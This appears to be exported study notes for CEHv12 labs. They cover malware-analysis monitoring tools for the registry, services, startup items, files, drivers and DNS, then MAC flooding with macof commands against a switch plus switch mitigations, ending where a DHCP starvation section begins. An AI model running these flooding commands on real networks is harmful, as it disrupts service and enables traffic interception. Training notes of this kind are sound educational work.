id="0f01d149-cd09-4fe5-a877-2c6d4048bb80" class="toggle"><li><details open=""><summary>Perform Registry Monitoring using Reg Organizer</summary><p id="679fd993-4b42-436e-8aec-9fa4865bac2a" class="">Reg Organizer is designed to edit keys and parameters, as well as to delete the content of.reg files. It allows users to perform various operations with the system registry</p><p id="558dfde4-b654-4b4d-9e5a-0775d86d72d9" class="">We will make a snapshot, install program and see the difference</p><p id="e21cc3da-e0cc-46db-a061-52fccafa0233" class="">
</p><ul id="91f337a1-002a-40c0-a7a2-d58e810c8681" class="bulleted-list"><li style="list-style-type:disc">Install <code>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Registry Monitoring Tools\Reg Organizer\reg-organizer-setup.exe</code></li></ul><ul id="23420f99-c7b0-4817-bf14-c9d723f9f430" class="bulleted-list"><li style="list-style-type:disc">Click <code>Miscellaneous Tools → Registry Snapshots</code></li></ul><ul id="ceee50d4-069d-446a-a02e-334ed730d985" class="bulleted-list"><li style="list-style-type:disc">Click <code>Create a Snapshot</code></li></ul><ul id="b1918e72-f739-49fe-ab69-c863d81fd8c2" class="bulleted-list"><li style="list-style-type:disc">Install any application, here <code><strong>CEH-Tools\CEHv12 Module 04 Enumeration\SNMP Enumeration Tools\SoftPerfect Network Scanner\netscan_setup.exe</strong></code></li></ul><ul id="a8e22ca4-0b2e-4346-90c5-415e1c0a72c7" class="bulleted-list"><li style="list-style-type:disc">Now click <code>Compare with current registry</code></li></ul><ul id="86a60bcb-5aeb-4204-8939-c2262b576b06" class="bulleted-list"><li style="list-style-type:disc">It shows the modified and created registry items after installing the software</li></ul><ul id="4a41e23d-e20c-4649-b76d-f2ae83663945" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="66998709-623a-427b-a7ce-bd63e8c16448" class="bulleted-list"><li style="list-style-type:disc"><strong>regshot</strong> (sourceforge.net)</li></ul><ul id="0c6d6846-c453-4220-a0dd-477537d1945b" class="bulleted-list"><li style="list-style-type:disc"><strong>Registry Viewer</strong> (accessdata.com)</li></ul><ul id="12a648d3-3989-4ccd-baa5-eec7f95dea83" class="bulleted-list"><li style="list-style-type:disc"><strong>RegScanner</strong> (nirsoft.net)</li></ul><ul id="467635af-82bf-47d3-ad5c-c6e13d277415" class="bulleted-list"><li style="list-style-type:disc"><strong>Registrar Registry Manager</strong> (resplendence.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="85220adb-6bec-48ca-a5e1-2f44a4d793f8" class="toggle"><li><details open=""><summary>Perform Windows Services Monitoring using Windows Service Manager (SrvMan)</summary><p id="0af4754f-df14-43a1-963b-1c6632b58dbd" class="">Attackers design malware and other malicious code in such a way that they install and run on a computer device in the form of a service. </p><p id="c2c17cec-ac90-42ef-a816-de534587f1a5" class="">As most services run in the background to support processes and applications, malicious services are invisible</p><p id="a9ddd195-8b13-49e0-8a9f-34d83ce92331" class="">
</p><ul id="eb5547d7-7570-4102-a448-66d61d046c3b" class="bulleted-list"><li style="list-style-type:disc"><strong>Run </strong><code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Services Monitoring Tools\Windows Service Manager (SrvMan)\x64\srvman.exe</strong></code></li></ul><ul id="4c0f4898-d58d-46f2-a473-1d03bae89dd1" class="bulleted-list"><li style="list-style-type:disc">The Service Manager shows the <strong>Internal name</strong>, <strong>State</strong>, <strong>Type</strong>, <strong>Display name</strong>, <strong>Start type</strong>, and <strong>Executable</strong> data of the services.</li></ul><ul id="7d1b8f9d-9b25-47f3-9c32-e3ac28a08573" class="bulleted-list"><li style="list-style-type:disc">Here, you can choose any unwanted service that is running on your computer, and <strong>Stop</strong> or <strong>Delete</strong> that service by choosing the appropriate action.</li></ul><ul id="6ff100f3-b084-4014-ab84-efa207aed99c" class="bulleted-list"><li style="list-style-type:disc">You can view the properties of the selected service by clicking on <strong>Properties</strong>.</li></ul><ul id="fdd1340d-759a-4817-9a24-476c793f7070" class="bulleted-list"><li style="list-style-type:disc">You can <strong>Start,</strong> <strong>Stop, Restart, Add and</strong> <strong>Delete services</strong>.</li></ul></details></li></ul><ul id="08d3d6d8-a170-42da-ab96-500c12f163d6" class="toggle"><li><details open=""><summary>Perform Startup Program Monitoring using Autoruns for Windows and WinPatrol</summary><ul id="e8ed9947-4e45-40b0-9ec2-c104d9675ffa" class="toggle"><li><details open=""><summary>Using Autoruns</summary><ul id="03f0d519-636b-4dc7-be2e-25f98274b5a6" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Windows Startup Programs Monitoring Tools\Autoruns for Windows\Autoruns.exe</strong></code></li></ul><ul id="fa995120-8381-470e-a4ef-5b29e3342ce1" class="bulleted-list"><li style="list-style-type:disc">By examining all these tabs, you can find any unwanted processes or applications running on the machine when the system boots up and stop or delete them manually.</li></ul><ul id="7681103b-bcb8-4098-8b5f-2a4b1793f83d" class="bulleted-list"><li style="list-style-type:disc"><strong>Autoruns</strong> main window appears. It displays all <strong>processes</strong>, <strong>dll’s</strong>, and <strong>services</strong></li></ul><ul id="eb1b0360-e60a-4ce7-bf68-7e3b4ea53db0" class="bulleted-list"><li style="list-style-type:disc"> <strong>Logon</strong> tab to view the applications that run automatically during login</li></ul><ul id="19fe1e0b-289e-4b99-92b6-abbc440ba97c" class="bulleted-list"><li style="list-style-type:disc">Click the <strong>Known DLLs</strong> tab to view all known DLLs that start automatically at system startup.</li></ul><ul id="4937a3b2-bc89-4ac0-944b-f1e78127b73d" class="bulleted-list"><li style="list-style-type:disc">Click the <strong>Drivers</strong> tab to view all application drivers that run automatically at system startup</li></ul><ul id="0ac71351-e33a-429c-9177-13117376ddb9" class="bulleted-list"><li style="list-style-type:disc">Click the <strong>Services</strong> tab displays all services that run automatically at system startup</li></ul><ul id="ba3ba0a3-e93f-4818-8b29-412c1107510f" class="bulleted-list"><li style="list-style-type:disc">Click the <strong>Explorer</strong> tab to view the explorer applications that run automatically at system startup</li></ul></details></li></ul><ul id="990786e4-5174-4fb7-a4f1-223b7e5f1f3c" class="toggle"><li><details open=""><summary>Using WinPatrol</summary><ul id="114fb182-7d2d-476c-af53-d8feb0397e1a" class="bulleted-list"><li style="list-style-type:disc"><code>Startup Programs</code> tab shows processes that affect startup, you can disable and kill them</li></ul><ul id="359c7c2e-8759-4008-8a0e-22922a779af4" class="bulleted-list"><li style="list-style-type:disc"><code><strong>IE Helpers</strong></code> tab shows all toolbars and links loaded by IE or other windows component.</li></ul><ul id="7b42c7a5-7562-4055-95a6-dea0eb6b24c9" class="bulleted-list"><li style="list-style-type:disc"> <code><strong>Services</strong></code> tab to displays the installed services on your system and right click will show info, can also disable it</li></ul><p id="7b148f71-f4b0-4907-80d2-8d3f7e3fdad8" class="">
</p></details></li></ul><ul id="bb8903a9-de99-4733-b70c-59142d2aac9c" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="8f061844-b572-4e0c-9cb4-48a21cd0471d" class="bulleted-list"><li style="list-style-type:disc"><strong>Autorun Organizer</strong> (chemtable.com)</li></ul><ul id="47ca95b8-ed04-44cc-9df7-4bf1ac27ec48" class="bulleted-list"><li style="list-style-type:disc"><strong>Quick Startup</strong> (glarysoft.com)</li></ul><ul id="35a0b490-ec2a-4e55-b079-a3609329b443" class="bulleted-list"><li style="list-style-type:disc"><strong>Chameleon Startup Manager</strong> (chameleon-managers.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="5acfa51b-7bf0-41e4-9d55-c2c632c9d6f5" class="toggle"><li><details open=""><summary>Perform Installation Monitoring using Mirekusoft Install Monitor</summary><p id="c62dacc4-cd87-4312-89c8-1f0c10dc6200" class="">When the system or users install or uninstall any software application, there is a chance that it will leave traces of the application data on the system. </p><p id="932003ee-4b56-4a27-be7b-f965cfaf1178" class="">Installation monitoring help to detect hidden and background installations that malware performs.</p><p id="953bc630-298c-4d59-9f24-ce06f083ef28" class="">
</p><p id="0b3ff2ab-0708-4829-96f0-51c5587aff92" class="">Install Monitor works by monitoring what resources such as file and registry, are created when a program is installed. </p><p id="f2914557-0204-4d20-9e9f-d63a5c97f68c" class="">It provides detailed information about the software installed, including how much disk space, CPU, and memory your programs are using.</p><p id="68f36066-7cf1-41b9-b6b2-5c6aa00959c6" class="">It also provides information about how often you use different programs.</p><p id="d979f513-2c34-4528-b87d-fdfc1af5dd92" class="">
</p><ul id="78ae554b-12d5-45db-a4a7-e29a08f57476" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Installation Monitoring Tools\Mirekusoft Install Monitor\SetupInstallMonitor.exe</strong></code></li></ul><ul id="0836ca9c-19a7-47ce-aa0e-db2e1741b4aa" class="bulleted-list"><li style="list-style-type:disc">Click on <code>Programs</code> tab and choose a program to uninstall</li></ul><ul id="0398e610-22e2-482f-ae32-4b3e947588a5" class="bulleted-list"><li style="list-style-type:disc">After uninstalling it will suggest removing leftovers</li></ul><ul id="572cb4c6-1402-46b3-973a-6bb147aff27e" class="bulleted-list"><li style="list-style-type:disc">It also monitors pc for changes so it can better detect leftovers</li></ul><ul id="f1632eda-8beb-4147-a848-2c24f7eade42" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="4b85dd86-e65a-4565-96b1-026e30d33b4c" class="bulleted-list"><li style="list-style-type:disc"><strong>SysAnalyzer</strong> (aldeid.com)</li></ul><ul id="1b531434-7486-4b2f-8c4a-00e48047747e" class="bulleted-list"><li style="list-style-type:disc"><strong>Advanced Uninstaller PRO</strong> (advanceduninstaller.com)</li></ul><ul id="7fc7f0d1-e121-4aa1-b4b4-7e970e4ef977" class="bulleted-list"><li style="list-style-type:disc"><strong>REVO UNINSTALLER PRO</strong> (revouninstaller.com)</li></ul><ul id="8cdf0979-fadd-4695-95c0-ad910b24602d" class="bulleted-list"><li style="list-style-type:disc"><strong>Comodo Programs Manager</strong> (comodo.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="d46a80bb-87e6-495a-bc1a-d482667a0ba7" class="toggle"><li><details open=""><summary>Perform Files and Folder Monitoring using PA File Sight</summary><p id="2b7a7a2b-178a-40cc-9a25-94449abe205b" class="">Malware can modify system files and folders to save information in them. </p><p id="0ba9ecd0-ba4b-4189-bdd5-a39a1623d93c" class="">You should be able to find the files and folders that malware creates and analyze them to collect any relevant stored information. </p><p id="c726e570-781b-4368-8456-679ca09a3f91" class="">It can also create a client-server where a service monitors and reports to a central server</p><p id="5d031bbf-a813-4a96-9035-3ac107f8454d" class="">
</p><ul id="a37e6765-b767-4dfc-99ea-549297f3902d" class="toggle"><li><details open=""><summary>Installing the server local</summary><ul id="741e25d2-cafa-4521-9b56-90c93e701afe" class="bulleted-list"><li style="list-style-type:disc">Run Installer <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Files and Folder Monitoring Tools\PA File Sight\FileSight_Trial_Key_E71BE154-2386-4CF3-BEA3-75830C985736.exe</strong></code></li></ul><ul id="8d192ac7-69a1-4389-acbd-9ceb960ad074" class="bulleted-list"><li style="list-style-type:disc">Click <code>Ultra</code> and then <code>Install Trial License</code></li></ul><ul id="47a41db2-0a19-428f-b15b-3ba909b5c0aa" class="bulleted-list"><li style="list-style-type:disc">Complete the wizard as it goes and when done make sure that both the <strong>Start the PA File Sight monitoring service</strong> and the <strong>Launch the PA File Sight Console</strong> options are checked, and click <strong>Finish</strong></li></ul><ul id="885d48ba-5d66-4173-b3af-21b3467c58eb" class="bulleted-list"><li style="list-style-type:disc"> <strong>PA File Sight Console</strong> window appears. By default, the <strong>Local host</strong> radio button is selected; click <strong>OK</strong>.</li></ul></details></li></ul><ul id="85a0f8b3-10ba-40b7-a187-a9b7b7b80422" class="toggle"><li><details open=""><summary>Installing a remote monitoring service</summary><ul id="60437354-8750-415e-af6d-5ad67f830f79" class="bulleted-list"><li style="list-style-type:disc">Run the installer again <code><strong>CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Files and Folder Monitoring Tools\PA File Sight\FileSight_Trial_Key_E71BE154-2386-4CF3-BEA3-75830C985736.exe</strong></code></li></ul><ul id="2d48dc56-b21d-4927-a68a-9f81dd74de97" class="bulleted-list"><li style="list-style-type:disc"><strong>Select Components</strong> wizard, uncheck the <strong>Central Monitoring Service</strong> and <strong>Console User Interface (configure all Services)</strong> options, and check the <strong>Satellite Monitoring Service (reports to the Central Monitoring Service)</strong> option; then, click <strong>Next</strong></li></ul><ul id="cea69cd0-8636-4787-9aa2-fb235ac81a86" class="bulleted-list"><li style="list-style-type:disc">In the final step of the installation, make sure that the <strong>Start the PA File Sight Satellite Monitoring Service</strong> and <strong>Configure the PA File Sight Satellite service</strong> options are checked; then, click <strong>Finish</strong></li></ul><ul id="4cc44aa6-070c-46a8-867a-cacc671477e2" class="bulleted-list"><li style="list-style-type:disc"><strong>Configure Satellite Monitoring Service</strong> window appears; type the <strong>Windows 11</strong> IP address into the <strong>Central monitoring service address</strong> field along with port <strong>8000</strong>. Leave the other settings to default and click <strong>Apply Settings</strong></li></ul><ul id="fd9f0fa2-be99-4ef6-b828-f0f933ebe926" class="bulleted-list"><li style="list-style-type:disc">Stop the sattelite service and start it again, then <code>Exit</code></li></ul><p id="39eccb32-4343-45f8-b22e-a7a5c99ff7d1" class=""><br/><br/><br/></p></details></li></ul><ul id="93669e9a-2f81-4bd3-a06f-96e9aa16c44b" class="toggle"><li><details open=""><summary>Testing the monitoring with file rule</summary><ul id="dc946a92-55e7-422e-8895-32d694d07f6b" class="bulleted-list"><li style="list-style-type:disc">Create a folder and a text file inside it just for testing</li></ul><ul id="f15d0e9e-8893-465d-afe2-ab704b238273" class="bulleted-list"><li style="list-style-type:disc">Go to the server</li></ul><ul id="d0d0dae9-6a11-4c00-92c2-c74f534e4cfb" class="bulleted-list"><li style="list-style-type:disc">Expand the <strong>Server2022</strong> node under Servers/Devices, select <strong>Inventory Collector</strong> in the left-hand pane, and click the <strong>Apply</strong> button from the right-hand pane</li></ul><ul id="32823a48-7d21-40ab-967a-4e03f3d5ccee" class="bulleted-list"><li style="list-style-type:disc">Now, right-click on <strong>Inventory Collector</strong> and click <strong>Run Now!</strong> from the context menu.</li></ul><ul id="d43fbd93-fa0b-4ac0-b951-af3794823a69" class="bulleted-list"><li style="list-style-type:disc"> <strong>Server2022</strong> in the left pane and scroll down in the right pane, and you can see the complete system information for the <strong>Windows Server 2022</strong> machine on the dashboard.</li></ul><ul id="d895825c-4a76-46e5-aa98-597ff76cd1e0" class="bulleted-list"><li style="list-style-type:disc">Right-click on <strong>Server2022</strong> and click the <strong>Add New Monitor</strong> option from the context menu.</li></ul><ul id="d634e52f-839b-42f6-a0f2-49726958c9fd" class="bulleted-list"><li style="list-style-type:disc">The <strong>Add New Monitor</strong> window appears, select the <strong>File Sight Monitor</strong> icon, and then click <strong>OK</strong></li></ul><ul id="1941c2a7-1dec-4368-b887-204e8c899e81" class="bulleted-list"><li style="list-style-type:disc">The <strong>File Sight Configuration</strong> window appears; click the <strong>Browse</strong> button to provide the folder we have set for monitoring</li></ul><ul id="324863a2-1820-46dc-af76-95a6205bd535" class="bulleted-list"><li style="list-style-type:disc">Choose <strong>Audit file activity</strong> from the <strong>Monitor Purpose (for configuration help)</strong> drop-down list, and then click <strong>Actions</strong>.</li></ul><ul id="cc16af88-606c-4da3-a1b1-68878d892edb" class="bulleted-list"><li style="list-style-type:disc">The <strong>Monitor Actions</strong> window appears; click <strong>New</strong> under <strong>Global Action List</strong></li></ul><ul id="6be37a9f-1147-4aae-be81-2381f029f6d8" class="bulleted-list"><li style="list-style-type:disc">The <strong>Add New Action</strong> window appears. Select the <strong>Action List</strong> icon and click <strong>OK</strong></li></ul><ul id="3c72f3af-8401-412e-b79b-9e5e3a4fd709" class="bulleted-list"><li style="list-style-type:disc">The <strong>Action List</strong> window appears. Type a description in the <strong>Description</strong> field and click <strong>Add</strong> to choose actions</li></ul><ul id="8a02b2cf-5b0b-4f23-b554-888129e184b9" class="bulleted-list"><li style="list-style-type:disc">The <strong>Choose Action to Add</strong> window appears; choose any action from the list and click <strong>OK</strong></li></ul><ul id="4ae1fd91-5294-4068-a018-5db4a92cd5f5" class="bulleted-list"><li style="list-style-type:disc">Click <strong>OK</strong> in the <strong>Action List</strong> window.</li></ul><ul id="2e1134f6-3109-4849-9e22-1ec0cce7ecbe" class="bulleted-list"><li style="list-style-type:disc">The <strong>Monitor Actions</strong> window appears; choose the newly created action (here, <strong>Monitoring File</strong>); and then click the <strong>&lt;&lt;</strong> icon to add the action</li></ul><ul id="9462c53f-e064-42d2-abe2-811d33c2e49e" class="bulleted-list"><li style="list-style-type:disc">Once the action is added to the <strong>Monitor Actions</strong> window, click <strong>OK</strong>.</li></ul><ul id="aa76a531-a3e3-4a70-9f7e-4a07362c3be7" class="bulleted-list"><li style="list-style-type:disc">In the <strong>File Sight Configuration</strong> window, click the <strong>File Activities</strong> tab and check the <strong>Existing file is written to</strong> and <strong>Ignore file appends (this is useful for monitoring log file integrity)</strong> options. Leave the other settings to default and click <strong>OK</strong></li></ul><ul id="5e6b69d4-8eb9-4bf7-9a50-f1c308f1ac3e" class="bulleted-list"><li style="list-style-type:disc">Under the <strong>Server2022</strong> node, <strong>Watch</strong> node will be added, select it and click <strong>Apply</strong> from the right-pane. Then right-click on the <strong>File Monitoring</strong> / <strong>Watch</strong> node and click <strong>Run Now!</strong> from the context menu.</li></ul><ul id="b8b463eb-140c-49d2-b129-b848b6b0e185" class="bulleted-list"><li style="list-style-type:disc">Click the <strong>Server2022</strong> node to view the dashboard. Scroll down in the dashboard; observe that the File Monitoring directory is being monitored.</li></ul><ul id="5104cd18-a7bd-44a5-8431-fd81140688d0" class="bulleted-list"><li style="list-style-type:disc">Now when changes happen to that folder, an alert will show up<br/><br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="676a8037-0490-493c-b2a7-797d8486403c" class="toggle"><li><details open=""><summary>Perform Device Driver Monitoring using DriverView and Driver Reviver</summary><p id="544e2d81-cb0f-4730-9bd7-7fd0986a27cc" class="">When the user downloads infected drivers from untrusted sources, the system installs malware along with the device drivers; malware uses these drivers as a shield to avoid detection.</p><p id="94b092d6-15a6-4f7d-82de-225fc60be114" class="">One can scan for suspicious device drivers using tools such as DriverView and Driver Reviver</p><p id="7dd1d01a-aa3b-4204-a940-3d26d3d7cd8d" class=""><strong>DriverView</strong> The DriverView utility displays a list of all device drivers.</p><p id="55a06ee8-c177-45f2-b6f1-4b368edd1fd1" class="">For each driver, information is displayed: the load address of the driver, description, version, product name, and developer.</p><p id="d5ecc1c6-41bc-4e50-824f-c0c04d60fae4" class=""><strong>Driver Reviver</strong> provides an effective way of scanning your PC to identify out of date drivers. Driver Reviver can quickly and easily update these drivers to restore optimum performance to your PC and its hardware and extend its life.</p><p id="276b5d01-b800-4997-830f-07755991a785" class="">
</p><ul id="c95a9d37-758b-4ecc-900e-9b08943ed500" class="bulleted-list"><li style="list-style-type:disc">For <strong>DriverView</strong>, run <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Device Drivers Monitoring Tools\DriverView\DriverView.exe</strong></code></li></ul><ul id="5fdea6b1-6e8e-42d1-adf8-605a18277882" class="bulleted-list"><li style="list-style-type:disc">It shows all the needed info about drivers</li></ul><ul id="80402bbd-013b-4344-838d-34f7eef7e8d2" class="bulleted-list"><li style="list-style-type:disc">Right Click → Properties shows more info</li></ul><p id="e71d3d88-6593-4c6d-be9c-cc4c6fa06027" class="">
</p><ul id="75dd53d3-3fa3-4cdb-886d-c5a534e93b96" class="bulleted-list"><li style="list-style-type:disc">For <strong>DriverReviver, </strong>run <code><strong>CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\Device Drivers Monitoring Tools\Driver Reviver\DriverReviverSetup.exe</strong></code></li></ul><ul id="73309168-75e5-4353-b1e5-128a6b9ce44e" class="bulleted-list"><li style="list-style-type:disc">You can select outdated drivers to update, scan your system, backup restore etc</li></ul><ul id="7b0effb8-559c-4490-b229-b93048e55a3a" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="150f2c0f-d9ec-476c-ab6a-e5e090a4bf7a" class="bulleted-list"><li style="list-style-type:disc"><strong>Driver Booster</strong> (iobit.com)</li></ul><ul id="522ff500-a0ef-4e0e-9911-235af41de21b" class="bulleted-list"><li style="list-style-type:disc"><strong>Driver Easy</strong> (drivereasy.com)</li></ul><ul id="44179567-4fbd-418c-9943-6eaf1863cea6" class="bulleted-list"><li style="list-style-type:disc"><strong>Driver Fusion</strong> (treexy.com)</li></ul><ul id="2ad3e171-6fe3-476b-b69b-b72cd5cbbb04" class="bulleted-list"><li style="list-style-type:disc"><strong>Driver Genius 22</strong> (driver-soft.com)</li></ul></details></li></ul></details></li></ul><ul id="e6339255-ac05-4e9f-a44a-b0dd8b720a95" class="toggle"><li><details open=""><summary>Perform DNS Monitoring using DNSQuerySniffer</summary><p id="adebf602-888c-4082-bfed-c31666647bbe" class="">DNSQuerySniffer is a network sniffer utility that shows the DNS queries sent on your system.</p><p id="ce86c1a0-af60-40cb-bf46-fdcf7e21527c" class="">For every DNS query, the following information is displayed: Host Name, Port Number, Query ID, Request Type (A, AAAA, NS, MX, and other types), Request Time, Response Time, Duration, Response Code, Number of records, and the content</p><p id="221b3945-bc7f-4990-8b9f-3ef51de1b833" class="">In real-time, attackers will use malicious applications like DNSChanger to change the DNS of the target machine.<br/><br/></p><ul id="ab6c1526-dec8-41e3-85eb-4159afb2b0ec" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Dynamic Malware Analysis Tools\DNS Monitoring Tools\DNSQuerySniffer\DNSQuerySniffer.exe</strong></code><code>.</code></li></ul><ul id="f5edb674-6632-4214-b899-f14b23915622" class="bulleted-list"><li style="list-style-type:disc">You can see all DNS Queries coming and going</li></ul><ul id="f97f25c0-22f2-4358-9899-fe5d5eca4241" class="bulleted-list"><li style="list-style-type:disc">Right click you can see properties information</li></ul><ul id="2456575e-14ab-4012-b240-50ce84359bef" class="bulleted-list"><li style="list-style-type:disc">Its like wireshark but we see only what we want to see without the overwhelm<br/><br/></li></ul><p id="a72bdb2f-d111-4ed4-bd7d-d7311a122db2" class="">
</p></details></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="e6ce21a0-cab1-4274-9190-52ab4128b3f8" class="toggle"><li><details open=""><summary>Lab 7 - Sniffing</summary><ul id="843be98e-9e5e-477f-83f6-bf8e658c84cd" class="toggle"><li><details open=""><summary>Active Sniffing</summary><ul id="b9e323e3-ee2a-4685-a5a6-5cad76125f84" class="toggle"><li><details open=""><summary>Perform Mac Flooding using macof</summary><p id="830c46c9-44c5-4666-a41c-f975fc19b949" class="">This tool floods the switch’s CAM tables (131,000 per minute) by sending forged MAC entries. When the MAC table fills up, the switch converts to a hub-like operation where an attacker can monitor the data being broadcast.</p><ul id="a51f1f8f-5965-47d9-8eea-0c44228f6e00" class="toggle"><li><details open=""><summary>Mitigation Techniques in Modern Switches</summary><ol type="1" id="c01ed968-ece6-4cdc-ad36-16afb492870f" class="numbered-list" start="1"><li><strong>Port Security</strong>:<ul id="93d73f71-fd90-48ca-8f6a-de6f7cbb0822" class="bulleted-list"><li style="list-style-type:disc"><strong>Port Security</strong> is a feature in many switches (like Cisco, HP, Juniper, etc.) that limits the number of MAC addresses that can be learned on a single port. If the number of learned MAC addresses exceeds the configured limit, the switch can take one of several actions:<ul id="8f41a68b-6eb9-40a6-bd6e-9890ac5d347a" class="bulleted-list"><li style="list-style-type:circle"><strong>Shutdown</strong>: The port is shut down and needs manual intervention to be reactivated.</li></ul><ul id="463010ec-972c-4061-8372-5993a876dfdf" class="bulleted-list"><li style="list-style-type:circle"><strong>Restrict</strong>: The port remains active, but no new MAC addresses are learned, and the switch can log the violation or send an SNMP trap.</li></ul><ul id="53d59da5-2207-4314-8c6d-6de6f464dd6d" class="bulleted-list"><li style="list-style-type:circle"><strong>Protect</strong>: Similar to restrict, but does not generate any log or alert.</li></ul></li></ul></li></ol><ol type="1" id="e2557d71-15d2-405c-b20e-f27eeadf0de6" class="numbered-list" start="2"><li><strong>Dynamic ARP Inspection (DAI)</strong>:<ul id="cd1bb6b1-952a-484a-b31c-09ad28489179" class="bulleted-list"><li style="list-style-type:disc">This security feature inspects ARP packets on the network to ensure that only valid ARP requests and responses are relayed. It helps prevent man-in-the-middle attacks that can result from MAC flooding.</li></ul></li></ol><ol type="1" id="85d44e58-463e-48f7-9198-347a434be067" class="numbered-list" start="3"><li><strong>DHCP Snooping</strong>:<ul id="56e6a24d-3ceb-4285-bfda-09e2b9321feb" class="bulleted-list"><li style="list-style-type:disc"><strong>DHCP Snooping</strong> is a security feature that acts as a firewall between untrusted hosts and trusted DHCP servers. It tracks MAC/IP bindings and ensures that only legitimate clients receive network configurations.</li></ul></li></ol><ol type="1" id="dd64a7b3-57dd-409a-aa0e-4f91bb29347e" class="numbered-list" start="4"><li><strong>MAC Address Table Aging</strong>:<ul id="64c6f857-9161-40ec-99e2-fe2b609afc86" class="bulleted-list"><li style="list-style-type:disc">Modern switches often have improved algorithms for aging out inactive MAC addresses more rapidly, reducing the risk of the table filling up.</li></ul></li></ol><ol type="1" id="f519ff32-1c31-4e11-a546-22ba67d7440e" class="numbered-list" start="5"><li><strong>Rate Limiting</strong>:<ul id="93d83c4a-4d92-48d0-9350-4ce5c86d30c8" class="bulleted-list"><li style="list-style-type:disc">Some switches implement rate limiting on MAC address learning, which can throttle the number of new MAC addresses that can be learned per port or per unit of time.</li></ul></li></ol><ol type="1" id="54a45994-57e0-43c3-ac45-6401c6a58dad" class="numbered-list" start="6"><li><strong>Floodguard and BPDU Guard</strong>:<ul id="e1b80e3c-4d2f-4c75-af28-461ae600a188" class="bulleted-list"><li style="list-style-type:disc">These features prevent unauthorized or rogue devices from affecting the network. Floodguard specifically monitors the behavior of MAC address learning and can block ports that attempt to learn too many addresses too quickly.</li></ul></li></ol><p id="3459e53d-8ff9-4be2-a0e2-67276df00393" class="">
</p><p id="9ffb08d7-17c3-42a0-86df-2ddcabb68358" class=""><br/><br/><br/></p><p id="2033b9e5-26f7-4371-b91d-6173b7864896" class="">
</p></details></li></ul><ul id="cb588e75-c6c5-42eb-9628-cafa87a346d5" class="toggle"><li><details open=""><summary>Perform an example attack</summary><ul id="7a8a73ee-92e4-4532-bbbb-4285cd3f5d81" class="bulleted-list"><li style="list-style-type:disc">Open wireshark to monitor the flood</li></ul><ul id="2738d7cd-11f3-467d-a322-b6319973d174" class="bulleted-list"><li style="list-style-type:disc">Open a terminal to start the flood<ul id="d2237dc4-4eaa-4417-827d-a63e0ca84607" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>macof -i eth0 -n 10</strong></code><ul id="098ae136-0dc3-4ce7-bada-c01e6cebc42c" class="bulleted-list"><li style="list-style-type:square"><code>-i</code> specifies the interface</li></ul><ul id="f58fe486-d7e2-44ab-8d7b-5f7bdddef457" class="bulleted-list"><li style="list-style-type:square"><code>-n</code> specifies the number of packets to be sent</li></ul></li></ul><ul id="f1c0d3ab-ddeb-4b05-9f2f-7ab476bef784" class="bulleted-list"><li style="list-style-type:circle">You can also target a single system using <code><strong>macof -i eth0 -d &lt;target&gt;</strong></code><ul id="b1b74287-f529-4278-8e2a-9ad5fc8ba368" class="bulleted-list"><li style="list-style-type:square"><code><strong>-d</strong></code> Specifies the destination IP address).</li></ul></li></ul></li></ul><ul id="3352fbd1-20ee-4632-9169-5f85070db33d" class="bulleted-list"><li style="list-style-type:disc">In the wireshark window we can observe:<ul id="f4fad923-7187-4b05-9548-ff1307678abe" class="bulleted-list"><li style="list-style-type:circle">IPv4 protocol packets from random source and destination with random MAC addresses as shown also in the output of the <strong>macof</strong> command<ul id="6a035566-0e17-4647-bfe5-e027e61061f1" class="bulleted-list"><li style="list-style-type:square">You can see them in the <code>Ethernet II</code> frame</li></ul></li></ul></li></ul></details></li></ul></details></li></ul><ul id="0348bebe-5f03-4fb3-97e5-f5fb25227f38" class="toggle"><li><details open=""><summary>Perform a DHCP Starvation Attack using Yersinia</summary><p id="a3d94e99-4e21-47fc-b2e3-72bbb58ff83e" class="">An attacker floods the DHCP server by sending a large number of DHCP requests and uses all available IP addresses that the DHCP server can issue. </p><p id="e81ef907-062c-4e37-8ab5-d0195add2421" class="">As a result, the server cannot issue any more IP addresses, leading to a Denial-of-Service (DoS) attack. </p><p id="bb864be7-7fc3-4251-90c9-6a568afc9f69" class="">Because of this issue, valid users cannot obtain or renew their IP addresses, and thus fail to access their network.</p><p id="fd38a36e-d96f-4d4a-aa95-da5d10654531" class="">
